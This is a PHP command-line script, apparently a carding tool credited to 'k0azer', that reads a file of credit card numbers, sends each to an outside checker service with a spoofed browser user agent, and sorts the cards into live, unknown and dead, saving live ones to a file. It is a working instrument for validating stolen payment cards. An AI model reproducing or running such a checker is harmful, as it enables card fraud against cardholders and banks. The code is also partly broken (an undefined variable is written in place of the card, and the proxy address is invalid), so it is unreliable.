<?php 
error_reporting(0);
echo "\033[1;31m[+]-==================================================-[+]\n";
echo"\t\t\033[1;33m 
  _     ___
 | |   / _ \
 | | _| | | | __ _ _______ _ __
 | |/ / | | |/ _` |_  / _ \ '__|
 |   <| |_| | (_| |/ /  __/ |
 |_|\_\\\___/ \__,_/___\___|_|
 
// Ssttt !!! be Quiet!
// CC Checker Extrap V.1
// CODED BY k0azer
// nhansanc3z@gmail.com\n";
echo "\033[1;31m[+]-==================================================-[+]\n\033[1;37m"; 
if(is_file($argv[1]) or die("\033[1;32m[+] USAGE: php checker.php yourmaillist.txt [+]\033[1;37m")) { 
$mailist = $argv[1]; 
$get_mail = file_get_contents("$mailist") ; 
$mail = (explode("\n", $get_mail)); 
echo "\nGetting Your Extrap Card , Just Wait......\n\n";
foreach($mail as $no => $card){
$ch = curl_init();
curl_setopt ($ch, CURLOPT_URL, "http://www.ke1.nl/en/checker/api.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
$user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36';
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
$payload = 'data='.$card.'';
$header = array();
$header[] = 'Origin: http://www.ke1.nl';
$header[] = 'X-Requested-With: XMLHttpRequest';
$header[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$header[] = 'Refferer: http://www.ke1.nl/en/checker/';
$header[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt ($ch, CURLOPT_POSTFIELDS, $payload);
//curl_setopt ($ch, CURLOPT_HEADER, true);
$proxy = '204.116.211.750';
$port = '8080';
//curl_setopt($ch, CURLOPT_PROXY, "167.71.182.13");
//curl_setopt($ch, CURLOPT_PROXYPORT, "3128");
curl_setopt($ch, CURLOPT_VERBOSE, 0);
$result = curl_exec($ch);
$live = "Live";
$unk = "Unknown";
$die = "Die";
date_default_timezone_set('Asia/Jakarta'); 
$waktu = date("H:i:s");
if(preg_match_all("/$live/",$result)){
	$buat_file = fopen("cc-live.txt", "a") or die("Unable to open file!");
	$tulis =("$email \r\n");
	fwrite($buat_file, $tulis);
	fclose($buat_file); 
	echo "\033[1;37m[$no] \033[1;32mLive => $card \033[1;37m[$waktu] \033[1;36mChecked by k0azer\n"; 
}
else if(preg_match_all("/$unk/",$result)){ 
	echo "\033[1;37m[$no] \033[1;34mUnknown => $card \033[1;37m[$waktu] \033[1;36mChecked by k0az3r\n";
}
else{
	echo "\033[1;37m[$no] \033[1;31mDie => $card \033[1;37m[$waktu] \033[1;36mChecked by k0az3r\n"; 
}
curl_close($ch);
}
}
?>
